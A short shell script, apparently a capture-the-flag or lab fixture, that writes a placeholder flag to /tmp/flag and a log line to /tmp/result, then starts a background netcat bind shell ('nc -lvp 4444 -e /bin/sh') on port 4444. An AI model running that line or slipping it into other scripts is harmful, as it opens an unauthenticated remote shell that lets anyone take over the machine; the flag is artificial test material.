#!/bin/sh

echo "script start" >> /tmp/result
echo "NORAZO{THIS_IS_FLAG}" >> /tmp/flag


nc -lvp 4444 -e /bin/sh &
